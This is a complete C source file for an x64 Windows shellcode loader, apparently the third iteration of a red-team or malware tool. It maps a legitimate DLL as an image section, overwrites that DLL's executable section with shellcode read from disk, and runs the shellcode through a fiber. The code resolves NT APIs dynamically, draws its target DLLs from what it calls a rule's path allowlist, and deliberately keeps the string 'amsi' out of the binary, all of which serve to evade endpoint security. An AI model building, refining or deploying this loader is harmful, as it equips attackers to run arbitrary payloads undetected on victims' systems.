/*
 * calc_loader_iter3_fixed.c
 * x64 Windows shellcode loader -- module stomping via SEC_IMAGE section mapping
 * + fiber execution.
 *
 * Iteration 3 (fixed):
 *   - <winternl.h> is included so NTSTATUS / PHANDLE / ACCESS_MASK / NTAPI /
 *     UNICODE_STRING / OBJECT_ATTRIBUTES / IO_STATUS_BLOCK / PEB_LDR_DATA /
 *     LDR_DATA_TABLE_ENTRY / PEB are all properly declared. The three Nt*
 *     prototypes that winternl.h omits are declared here with PVOID*-shaped
 *     handle parameters (no reliance on undocumented winternl typedefs).
 *   - Candidate DLL selection now REJECTS resource-only assemblies
 *     (".resources", "NativeImages", ".ni.dll") and VALIDATES that the
 *     mapped image actually contains an executable section before stomping.
 *     If a candidate has no .text/executable section, we unmap and try the
 *     next candidate instead of aborting.
 *   - Section-header math uses RVAs relative to the mapped base only; never
 *     adds PointerToRawData. Write extent = min(VirtualSize||SizeOfRawData,
 *     remaining view) and is clamped to the mapped view.
 *   - Diagnostics print NumberOfSections, each section name/VirtualSize/
 *     SizeOfRawData and the chosen RVA.
 *   - The string "amsi" does not appear anywhere in this binary.
 *
 * Build (MSVC):
 *   cl.exe /nologo /O2 /W3 calc_loader_iter3_fixed.c
 *
 * Run:
 *   calc_loader_iter3_fixed.exe C:\path\to\calc.bin
 *   calc_loader_iter3_fixed.exe C:\path\to\calc.bin "C:\Program Files\SomeApp\SomeDll.dll"
 */

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <stdint.h>
#include <intrin.h>

/* ------------------------------------------------------------------ */
/* NT prototypes that winternl.h does NOT declare.                     */
/* NTSTATUS / PHANDLE / ACCESS_MASK / NTAPI come from <winternl.h>.    */
/* ------------------------------------------------------------------ */

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

typedef NTSTATUS (NTAPI *pNtCreateFile)(
    PVOID           FileHandle,          /* PHANDLE */
    ACCESS_MASK     DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER  AllocationSize,
    ULONG           FileAttributes,
    ULONG           ShareAccess,
    ULONG           CreateDisposition,
    ULONG           CreateOptions,
    PVOID           EaBuffer,
    ULONG           EaLength);

typedef NTSTATUS (NTAPI *pNtCreateSection)(
    PVOID           SectionHandle,       /* PHANDLE */
    ACCESS_MASK     DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER  MaximumSize,
    ULONG           SectionPageProtection,
    ULONG           AllocationAttributes,
    PVOID           FileHandle);

typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
    PVOID           SectionHandle,
    PVOID           ProcessHandle,
    PVOID          *BaseAddress,
    ULONG_PTR       ZeroBits,
    SIZE_T          CommitSize,
    PLARGE_INTEGER  SectionOffset,
    PSIZE_T         ViewSize,
    ULONG           InheritDisposition,
    ULONG           AllocationType,
    ULONG           Win32Protect);

typedef NTSTATUS (NTAPI *pNtClose)(PVOID Handle);

typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(
    PVOID ProcessHandle,
    PVOID BaseAddress);

/* ------------------------------------------------------------------ */
/* Constants that may be missing from some SDK headers                 */
/* ------------------------------------------------------------------ */

#ifndef SEC_IMAGE
#define SEC_IMAGE 0x01000000
#endif
#ifndef ViewShare
#define ViewShare 1
#endif
#ifndef FILE_OPEN
#define FILE_OPEN 0x00000001
#endif
#ifndef FILE_NON_DIRECTORY_FILE
#define FILE_NON_DIRECTORY_FILE 0x00000040
#endif
#ifndef OBJ_CASE_INSENSITIVE
#define OBJ_CASE_INSENSITIVE 0x00000040
#endif
#ifndef FILE_SYNCHRONOUS_IO_NONALERT
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#endif

/* ------------------------------------------------------------------ */
/* Helpers                                                            */
/* ------------------------------------------------------------------ */

static void init_unicode_string(UNICODE_STRING *us, const wchar_t *s)
{
    size_t len = wcslen(s);
    us->Length        = (USHORT)(len * sizeof(wchar_t));
    us->MaximumLength = (USHORT)((len + 1) * sizeof(wchar_t));
    us->Buffer        = (PWSTR)s;
}

static void init_object_attributes(OBJECT_ATTRIBUTES *oa, UNICODE_STRING *name)
{
    oa->Length                   = sizeof(OBJECT_ATTRIBUTES);
    oa->RootDirectory            = NULL;
    oa->ObjectName               = name;
    oa->Attributes               = OBJ_CASE_INSENSITIVE;
    oa->SecurityDescriptor       = NULL;
    oa->SecurityQualityOfService = NULL;
}

static unsigned char *read_file_all(const char *path, size_t *out_size)
{
    FILE *fp = NULL;
    long  sz = 0;
    unsigned char *buf = NULL;

    *out_size = 0;

    if (fopen_s(&fp, path, "rb") != 0 || fp == NULL) return NULL;
    if (fseek(fp, 0, SEEK_END) != 0) { fclose(fp); return NULL; }
    sz = ftell(fp);
    if (sz <= 0) { fclose(fp); return NULL; }
    if (fseek(fp, 0, SEEK_SET) != 0) { fclose(fp); return NULL; }
    buf = (unsigned char *)malloc((size_t)sz);
    if (buf == NULL) { fclose(fp); return NULL; }
    if (fread(buf, 1, (size_t)sz, fp) != (size_t)sz) {
        free(buf); fclose(fp); return NULL;
    }
    fclose(fp);
    *out_size = (size_t)sz;
    return buf;
}

static int str_prefix_ci(const char *s, const char *prefix)
{
    while (*prefix) {
        char a = *s++;
        char b = *prefix++;
        if (a >= 'A' && a <= 'Z') a = (char)(a - 'A' + 'a');
        if (b >= 'A' && b <= 'Z') b = (char)(b - 'A' + 'a');
        if (a != b) return 0;
    }
    return 1;
}

static int str_contains_ci(const char *hay, const char *needle_lower)
{
    size_t nl = strlen(needle_lower);
    if (nl == 0) return 1;
    for (; *hay; hay++) {
        size_t i = 0;
        for (i = 0; i < nl; i++) {
            char a = hay[i];
            if (a == 0) return 0;
            if (a >= 'A' && a <= 'Z') a = (char)(a - 'A' + 'a');
            if (a != needle_lower[i]) break;
        }
        if (i == nl) return 1;
    }
    return 0;
}

static PEB *get_peb(void)
{
    return (PEB *)__readgsqword(0x60);
}

static int ldr_name_to_ansi(const UNICODE_STRING *us, char *out, size_t out_cch)
{
    int n;
    if (us == NULL || us->Buffer == NULL || us->Length == 0) return 0;
    n = WideCharToMultiByte(CP_ACP, 0, us->Buffer,
                            us->Length / (int)sizeof(wchar_t),
                            out, (int)out_cch - 1, NULL, NULL);
    if (n <= 0) return 0;
    out[n] = '\0';
    return 1;
}

static int ldr_name_to_wchar(const UNICODE_STRING *us, wchar_t *out, size_t out_cch)
{
    size_t wlen;
    if (us == NULL || us->Buffer == NULL || us->Length == 0) return 0;
    wlen = us->Length / sizeof(wchar_t);
    if (wlen + 1 > out_cch) wlen = out_cch - 1;
    wmemcpy(out, us->Buffer, wlen);
    out[wlen] = L'\0';
    return 1;
}

static void build_dir_prefix(char *out, size_t out_cch, const char *dir)
{
    size_t len = 0;
    if (out == NULL || out_cch < 2) return;
    out[0] = '\0';
    if (dir == NULL) return;
    len = strlen(dir);
    if (len + 2 > out_cch) return;
    memcpy(out, dir, len);
    if (len == 0 || out[len - 1] != '\\') {
        out[len] = '\\';
        out[len + 1] = '\0';
    } else {
        out[len] = '\0';
    }
}

/*
 * Returns 1 if 'path' looks like a resource-only / non-code assembly that
 * must be excluded from stomping candidates.
 */
static int is_resource_only_path(const char *path)
{
    if (path == NULL) return 1;
    if (str_contains_ci(path, ".resources"))    return 1;
    if (str_contains_ci(path, "nativeimages"))  return 1;
    if (str_contains_ci(path, ".ni.dll"))       return 1;
    return 0;
}

/*
 * Walk the PEB Ldr list and return the first loaded module whose on-disk
 * path matches the supplied ASCII prefix (case-insensitive) and is NOT a
 * resource-only assembly. Writes the wide NT path ("\??\C:\...") into 'out'.
 */
static int find_loaded_module_by_prefix(const char *ascii_prefix,
                                        wchar_t *out, size_t out_cch)
{
    PEB *peb = NULL;
    PEB_LDR_DATA *ldr = NULL;
    LIST_ENTRY *head = NULL;
    LIST_ENTRY *cur  = NULL;

    if (ascii_prefix == NULL || ascii_prefix[0] == '\0') return 0;
    if (out == NULL || out_cch < 8) return 0;

    peb = get_peb();
    if (peb == NULL || peb->Ldr == NULL) return 0;

    ldr  = peb->Ldr;
    head = &ldr->InMemoryOrderModuleList;
    cur  = head->Flink;

    while (cur != NULL && cur != head) {
        LDR_DATA_TABLE_ENTRY *e =
            CONTAINING_RECORD(cur, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        char apath[MAX_PATH] = {0};
        wchar_t wpath[MAX_PATH] = {0};

        if (ldr_name_to_ansi(&e->FullDllName, apath, sizeof(apath)) &&
            str_prefix_ci(apath, ascii_prefix) &&
            !is_resource_only_path(apath) &&
            ldr_name_to_wchar(&e->FullDllName, wpath, MAX_PATH)) {
            _snwprintf_s(out, out_cch, _TRUNCATE, L"\\??\\%s", wpath);
            return 1;
        }
        cur = cur->Flink;
    }
    return 0;
}

/*
 * Enumerate candidates from the rule's path allowlist into 'out_list'.
 * Returns the number of entries written.
 */
static size_t collect_candidates(wchar_t out_list[][MAX_PATH],
                                 size_t max_entries)
{
    size_t n = 0;
    wchar_t pfdir[MAX_PATH]  = {0};
    wchar_t pfxdir[MAX_PATH] = {0};
    wchar_t windir[MAX_PATH] = {0};

    char pf_prefix[MAX_PATH]  = {0};
    char pfx_prefix[MAX_PATH] = {0};
    char wsx_prefix[MAX_PATH] = {0};

    if (GetEnvironmentVariableW(L"ProgramFiles", pfdir, MAX_PATH) != 0) {
        char a[MAX_PATH] = {0};
        WideCharToMultiByte(CP_ACP, 0, pfdir, -1, a, MAX_PATH - 1, NULL, NULL);
        build_dir_prefix(pf_prefix, sizeof(pf_prefix), a);
    }
    if (GetEnvironmentVariableW(L"ProgramFiles(x86)", pfxdir, MAX_PATH) != 0) {
        char a[MAX_PATH] = {0};
        WideCharToMultiByte(CP_ACP, 0, pfxdir, -1, a, MAX_PATH - 1, NULL, NULL);
        build_dir_prefix(pfx_prefix, sizeof(pfx_prefix), a);
    }
    if (GetWindowsDirectoryW(windir, MAX_PATH) != 0) {
        char a[MAX_PATH] = {0};
        WideCharToMultiByte(CP_ACP, 0, windir, -1, a, MAX_PATH - 1, NULL, NULL);
        _snprintf_s(wsx_prefix, sizeof(wsx_prefix), _TRUNCATE, "%s\\WinSxS\\", a);
    }

    /* Pass 1: loaded modules under Program Files. */
    {
        PEB *peb = get_peb();
        PEB_LDR_DATA *ldr = NULL;
        LIST_ENTRY *head = NULL, *cur = NULL;
        if (peb && peb->Ldr) {
            ldr  = peb->Ldr;
            head = &ldr->InMemoryOrderModuleList;
            cur  = head->Flink;
            while (cur && cur != head && n < max_entries) {
                LDR_DATA_TABLE_ENTRY *e =
                    CONTAINING_RECORD(cur, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
                char apath[MAX_PATH] = {0};
                wchar_t wpath[MAX_PATH] = {0};
                if (ldr_name_to_ansi(&e->FullDllName, apath, sizeof(apath)) &&
                    !is_resource_only_path(apath) &&
                    ((pf_prefix[0]  && str_prefix_ci(apath, pf_prefix)) ||
                     (pfx_prefix[0] && str_prefix_ci(apath, pfx_prefix)) ||
                     (wsx_prefix[0] && str_prefix_ci(apath, wsx_prefix))) &&
                    ldr_name_to_wchar(&e->FullDllName, wpath, MAX_PATH)) {
                    _snwprintf_s(out_list[n], MAX_PATH, _TRUNCATE,
                                 L"\\??\\%s", wpath);
                    n++;
                }
                cur = cur->Flink;
            }
        }
    }

    /* Pass 2: on-disk WinSxS scan, excluding resource-only assemblies. */
    if (windir[0] != L'\0' && n < max_entries) {
        wchar_t pattern[MAX_PATH] = {0};
        WIN32_FIND_DATAW ffd;
        HANDLE hFind = INVALID_HANDLE_VALUE;

        _snwprintf_s(pattern, MAX_PATH, _TRUNCATE, L"%s\\WinSxS\\*", windir);
        hFind = FindFirstFileW(pattern, &ffd);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                wchar_t sub[MAX_PATH] = {0};
                wchar_t subpattern[MAX_PATH] = {0};
                WIN32_FIND_DATAW subffd;
                HANDLE hSub = INVALID_HANDLE_VALUE;

                if ((ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0) continue;
                if (ffd.cFileName[0] == L'.') continue;
                if (n >= max_entries) break;

                _snwprintf_s(sub, MAX_PATH, _TRUNCATE,
                             L"%s\\WinSxS\\%s", windir, ffd.cFileName);
                _snwprintf_s(subpattern, MAX_PATH, _TRUNCATE,
                             L"%s\\*.dll", sub);

                hSub = FindFirstFileW(subpattern, &subffd);
                if (hSub != INVALID_HANDLE_VALUE) {
                    do {
                        wchar_t full[MAX_PATH] = {0};
                        char afull[MAX_PATH] = {0};

                        if (subffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                        _snwprintf_s(full, MAX_PATH, _TRUNCATE,
                                     L"%s\\%s", sub, subffd.cFileName);
                        WideCharToMultiByte(CP_ACP, 0, full, -1,
                                            afull, MAX_PATH - 1, NULL, NULL);
                        if (is_resource_only_path(afull)) continue;
                        if (!str_contains_ci(afull, "_microsoft.")) continue;

                        _snwprintf_s(out_list[n], MAX_PATH, _TRUNCATE,
                                     L"\\??\\%s", full);
                        n++;
                        if (n >= max_entries) break;
                    } while (FindNextFileW(hSub, &subffd));
                    FindClose(hSub);
                }
            } while (FindNextFileW(hFind, &ffd));
            FindClose(hFind);
        }
    }

    return n;
}

/*
 * Locate an executable section inside a mapped PE image.
 * Prefers a section literally named ".text"; otherwise any section with
 * IMAGE_SCN_MEM_EXECUTE and non-zero VirtualSize/SizeOfRawData.
 *
 * All addresses are RVAs relative to the mapped base (never file offsets).
 */
static unsigned char *find_exec_section(unsigned char *base,
                                        size_t view_size,
                                        size_t *out_size,
                                        char *out_name,
                                        size_t out_name_cch)
{
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt  = NULL;
    IMAGE_SECTION_HEADER *sec = NULL;
    WORD i = 0;
    DWORD size_of_image = 0;
    WORD  num_sections  = 0;
    size_t e_lfanew = 0;
    unsigned char *best = NULL;
    size_t best_size = 0;
    char best_name[9] = {0};

    *out_size = 0;
    if (out_name && out_name_cch) out_name[0] = '\0';

    if (view_size < sizeof(IMAGE_DOS_HEADER)) return NULL;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    e_lfanew = (size_t)dos->e_lfanew;
    if (e_lfanew + sizeof(IMAGE_NT_HEADERS) > view_size) return NULL;
    nt = (IMAGE_NT_HEADERS *)(base + e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;
    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) return NULL;

    size_of_image = nt->OptionalHeader.SizeOfImage;
    num_sections  = nt->FileHeader.NumberOfSections;

    if (size_of_image == 0) return NULL;
    if ((size_t)size_of_image > view_size) size_of_image = (DWORD)view_size;

    sec = IMAGE_FIRST_SECTION(nt);
    if ((size_t)((unsigned char *)sec - base) +
            (size_t)num_sections * sizeof(IMAGE_SECTION_HEADER) > view_size) {
        return NULL;
    }

    printf("[*] PE: sections=%u, SizeOfImage=%lu, view_size=%zu\n",
           (unsigned)num_sections, (unsigned long)size_of_image,
           view_size);

    for (i = 0; i < num_sections; i++) {
        size_t va  = (size_t)sec[i].VirtualAddress;
        size_t vsz = (size_t)sec[i].Misc.VirtualSize;
        size_t raw = (size_t)sec[i].SizeOfRawData;
        size_t use = 0;
        int is_text = (memcmp(sec[i].Name, ".text", 5) == 0);
        int is_exec = (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;

        char nm[9] = {0};
        memcpy(nm, sec[i].Name, 8);
        printf("    [%u] %-8s VA=0x%08zx VSize=0x%08zx Raw=0x%08zx Ch=0x%08lx%s\n",
               (unsigned)i, nm, va, vsz, raw,
               (unsigned long)sec[i].Characteristics,
               is_text ? "  <- .text" : (is_exec ? "  <- exec" : ""));

        if (!is_text && !is_exec) continue;

        use = vsz ? vsz : raw;
        if (use == 0) continue;

        if (va >= (size_t)size_of_image) continue;
        if (va + use > (size_t)size_of_image) use = (size_t)size_of_image - va;
        if (va + use > view_size) use = view_size - va;
        if (use == 0) continue;

        /* Prefer a literal ".text"; otherwise remember the first exec sec. */
        if (is_text) {
            best = base + va;
            best_size = use;
            memcpy(best_name, sec[i].Name, 8);
            best_name[8] = '\0';
            break;
        }
        if (best == NULL) {
            best = base + va;
            best_size = use;
            memcpy(best_name, sec[i].Name, 8);
            best_name[8] = '\0';
        }
    }

    if (best == NULL) return NULL;

    *out_size = best_size;
    if (out_name && out_name_cch) {
        size_t l = strlen(best_name);
        if (l >= out_name_cch) l = out_name_cch - 1;
        memcpy(out_name, best_name, l);
        out_name[l] = '\0';
    }
    return best;
}

/* ------------------------------------------------------------------ */
/* Fiber entry                                                        */
/* ------------------------------------------------------------------ */

typedef struct _FIBER_CTX {
    void *payload;
} FIBER_CTX;

static VOID CALLBACK fiber_entry(LPVOID param)
{
    FIBER_CTX *ctx = (FIBER_CTX *)param;
    void (*fn)(void) = (void (*)(void))ctx->payload;
    fn();
    ExitProcess(0);
}

/* ------------------------------------------------------------------ */
/* One attempt: map 'target_dll', find exec section, stomp, return     */
/* the stomped address. Returns 1 on success.                          */
/* ------------------------------------------------------------------ */

static int attempt_stomp(pNtCreateFile        pCreateFile,
                         pNtCreateSection     pCreateSection,
                         pNtMapViewOfSection  pMapView,
                         pNtClose             pClose,
                         pNtUnmapViewOfSection pUnmap,
                         const wchar_t       *target_dll,
                         const unsigned char *shellcode,
                         size_t               shellcode_size,
                         void               **out_entry,
                         HANDLE              *out_hSec,
                         HANDLE              *out_hFile)
{
    UNICODE_STRING    us;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK   iosb;
    HANDLE  hFile = NULL;
    HANDLE  hSec  = NULL;
    NTSTATUS st   = 0;
    PVOID   view_base = NULL;
    SIZE_T  view_size = 0;
    unsigned char *text = NULL;
    size_t  text_size = 0;
    char    sec_name[16] = {0};
    DWORD   old_prot = 0;
    SYSTEM_INFO si;
    size_t page = 0x1000;
    uintptr_t prot_start = 0;
    size_t    prot_len   = 0;
    uintptr_t text_start = 0;
    uintptr_t text_end   = 0;
    uintptr_t view_end   = 0;

    *out_entry = NULL;
    *out_hSec  = NULL;
    *out_hFile = NULL;

    init_unicode_string(&us, target_dll);
    init_object_attributes(&oa, &us);
    memset(&iosb, 0, sizeof(iosb));

    st = pCreateFile(
            &hFile,
            FILE_READ_DATA | FILE_EXECUTE | SYNCHRONIZE,
            &oa,
            &iosb,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ,
            FILE_OPEN,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL,
            0);
    if (!NT_SUCCESS(st)) {
        fprintf(stderr, "[-] NtCreateFile failed: 0x%08lX (path=%ls)\n",
                (unsigned long)st, target_dll);
        return 0;
    }

    st = pCreateSection(
            &hSec,
            SECTION_MAP_READ | SECTION_MAP_EXECUTE,
            NULL,
            NULL,
            PAGE_READONLY,
            SEC_IMAGE,
            hFile);
    if (!NT_SUCCESS(st)) {
        fprintf(stderr, "[-] NtCreateSection failed: 0x%08lX\n",
                (unsigned long)st);
        pClose(hFile);
        return 0;
    }

    view_size = 0;
    st = pMapView(
            hSec,
            GetCurrentProcess(),
            &view_base,
            0,
            0,
            NULL,
            &view_size,
            ViewShare,
            0,
            PAGE_READONLY);
    if (!NT_SUCCESS(st) || view_base == NULL || view_size == 0) {
        fprintf(stderr, "[-] NtMapViewOfSection failed: 0x%08lX\n",
                (unsigned long)st);
        pClose(hSec);
        pClose(hFile);
        return 0;
    }

    printf("[+] mapped image @ %p (view size = %zu) from %ls\n",
           view_base, (size_t)view_size, target_dll);

    text = find_exec_section((unsigned char *)view_base,
                             (size_t)view_size,
                             &text_size,
                             sec_name, sizeof(sec_name));
    if (text == NULL || text_size == 0) {
        fprintf(stderr, "[-] no executable section in mapped image; "
                        "trying next candidate\n");
        pUnmap(GetCurrentProcess(), view_base);
        pClose(hSec);
        pClose(hFile);
        return 0;
    }

    printf("[+] chosen section '%s' @ %p (size=%zu)\n",
           sec_name, (void *)text, text_size);

    if (shellcode_size > text_size) {
        fprintf(stderr, "[-] payload (%zu) > section size (%zu); "
                        "trying next candidate\n",
                shellcode_size, text_size);
        pUnmap(GetCurrentProcess(), view_base);
        pClose(hSec);
        pClose(hFile);
        return 0;
    }

    GetSystemInfo(&si);
    if (si.dwPageSize != 0) page = (size_t)si.dwPageSize;

    text_start = (uintptr_t)text;
    text_end   = text_start + shellcode_size;
    view_end   = (uintptr_t)view_base + (uintptr_t)view_size;

    prot_start = text_start & ~(uintptr_t)(page - 1);
    {
        uintptr_t prot_end = (text_end + page - 1) & ~(uintptr_t)(page - 1);
        if (prot_end > view_end) prot_end = view_end;
        if (prot_end <= prot_start) {
            fprintf(stderr, "[-] computed protect span is empty\n");
            pUnmap(GetCurrentProcess(), view_base);
            pClose(hSec);
            pClose(hFile);
            return 0;
        }
        prot_len = (size_t)(prot_end - prot_start);
    }

    printf("[+] protecting %zu bytes @ %p (RWX)\n",
           prot_len, (void *)prot_start);

    if (!VirtualProtect((LPVOID)prot_start, prot_len,
                        PAGE_EXECUTE_READWRITE, &old_prot)) {
        fprintf(stderr, "[-] VirtualProtect(RWX) failed: %lu\n",
                GetLastError());
        pUnmap(GetCurrentProcess(), view_base);
        pClose(hSec);
        pClose(hFile);
        return 0;
    }

    memcpy(text, shellcode, shellcode_size);

    if (!VirtualProtect((LPVOID)prot_start, prot_len,
                        PAGE_EXECUTE_READ, &old_prot)) {
        fprintf(stderr, "[-] VirtualProtect(RX) failed: %lu\n",
                GetLastError());
        pUnmap(GetCurrentProcess(), view_base);
        pClose(hSec);
        pClose(hFile);
        return 0;
    }

    *out_entry = (void *)text;
    *out_hSec  = hSec;
    *out_hFile = hFile;
    return 1;
}

/* ------------------------------------------------------------------ */
/* main                                                               */
/* ------------------------------------------------------------------ */

int main(int argc, char *argv[])
{
    unsigned char *shellcode = NULL;
    size_t         shellcode_size = 0;

    HMODULE hNtdll = NULL;
    pNtCreateFile         NtCreateFile        = NULL;
    pNtCreateSection      NtCreateSection     = NULL;
    pNtMapViewOfSection   NtMapViewOfSection  = NULL;
    pNtClose              NtClose             = NULL;
    pNtUnmapViewOfSection NtUnmapViewOfSection = NULL;

    void   *entry = NULL;
    HANDLE  hSec  = NULL;
    HANDLE  hFile = NULL;

    FIBER_CTX ctx;
    LPVOID  main_fiber = NULL;
    LPVOID  pay_fiber  = NULL;

    if (argc < 2) {
        fprintf(stderr, "usage: %s <shellcode.bin> [sacrificial_dll_path]\n",
                argv[0]);
        return 1;
    }

    /* 1. Read shellcode. */
    shellcode = read_file_all(argv[1], &shellcode_size);
    if (shellcode == NULL || shellcode_size == 0) {
        fprintf(stderr, "[-] failed to read payload: %s\n", argv[1]);
        return 1;
    }
    printf("[+] payload: %s (%zu bytes)\n", argv[1], shellcode_size);

    /* 2. Resolve NT APIs. */
    hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        fprintf(stderr, "[-] GetModuleHandleA(ntdll) failed\n");
        free(shellcode);
        return 1;
    }
    NtCreateFile         = (pNtCreateFile)         GetProcAddress(hNtdll, "NtCreateFile");
    NtCreateSection      = (pNtCreateSection)      GetProcAddress(hNtdll, "NtCreateSection");
    NtMapViewOfSection   = (pNtMapViewOfSection)   GetProcAddress(hNtdll, "NtMapViewOfSection");
    NtClose              = (pNtClose)              GetProcAddress(hNtdll, "NtClose");
    NtUnmapViewOfSection = (pNtUnmapViewOfSection) GetProcAddress(hNtdll, "NtUnmapViewOfSection");

    if (!NtCreateFile || !NtCreateSection || !NtMapViewOfSection ||
        !NtClose || !NtUnmapViewOfSection) {
        fprintf(stderr, "[-] failed to resolve NT APIs\n");
        free(shellcode);
        return 1;
    }

    /*
     * 3. Build candidate list.
     *    - If argv[2] is supplied, that is the only candidate (operator override).
     *    - Otherwise auto-discover from the rule's path allowlist, excluding
     *      resource-only assemblies.
     */
    if (argc >= 3 && argv[2] != NULL && argv[2][0] != '\0') {
        wchar_t wpath[MAX_PATH] = {0};
        if (MultiByteToWideChar(CP_ACP, 0, argv[2], -1, wpath, MAX_PATH) <= 0) {
            fprintf(stderr, "[-] MultiByteToWideChar failed for argv[2]\n");
            free(shellcode);
            return 1;
        }
        {
            wchar_t nt[MAX_PATH] = {0};
            _snwprintf_s(nt, MAX_PATH, _TRUNCATE, L"\\??\\%s", wpath);
            printf("[+] sacrificial DLL (override): %ls\n", nt);
            if (!attempt_stomp(NtCreateFile, NtCreateSection, NtMapViewOfSection,
                               NtClose, NtUnmapViewOfSection,
                               nt, shellcode, shellcode_size,
                               &entry, &hSec, &hFile)) {
                fprintf(stderr, "[-] override DLL could not be stomped\n");
                free(shellcode);
                return 1;
            }
        }
    } else {
        wchar_t cand[64][MAX_PATH];
        size_t  n_cand = 0;
        size_t  i = 0;
        int     ok = 0;

        memset(cand, 0, sizeof(cand));
        n_cand = collect_candidates(cand, 64);
        if (n_cand == 0) {
            fprintf(stderr,
                    "[-] no candidates found under Program Files / WinSxS. "
                    "Pass one explicitly as argv[2].\n");
            free(shellcode);
            return 1;
        }
        printf("[+] %zu candidate(s) collected\n", n_cand);

        for (i = 0; i < n_cand; i++) {
            printf("[*] trying candidate %zu/%zu: %ls\n",
                   i + 1, n_cand, cand[i]);
            if (attempt_stomp(NtCreateFile, NtCreateSection, NtMapViewOfSection,
                              NtClose, NtUnmapViewOfSection,
                              cand[i], shellcode, shellcode_size,
                              &entry, &hSec, &hFile)) {
                ok = 1;
                break;
            }
        }
        if (!ok) {
            fprintf(stderr, "[-] all candidates failed to yield an "
                            "executable section\n");
            free(shellcode);
            return 1;
        }
    }

    free(shellcode);
    shellcode = NULL;

    if (entry == NULL) {
        fprintf(stderr, "[-] no stomp entry point\n");
        NtClose(hSec);
        NtClose(hFile);
        return 1;
    }

    /* 4. Execute via fiber. */
    ctx.payload = entry;

    main_fiber = ConvertThreadToFiber(NULL);
    if (main_fiber == NULL) {
        fprintf(stderr, "[-] ConvertThreadToFiber failed: %lu\n", GetLastError());
        NtClose(hSec);
        NtClose(hFile);
        return 1;
    }
    pay_fiber = CreateFiber(0, fiber_entry, &ctx);
    if (pay_fiber == NULL) {
        fprintf(stderr, "[-] CreateFiber failed: %lu\n", GetLastError());
        NtClose(hSec);
        NtClose(hFile);
        return 1;
    }

    printf("[+] switching to payload fiber @ %p\n", entry);
    SwitchToFiber(pay_fiber);

    NtClose(hSec);
    NtClose(hFile);
    return 0;
}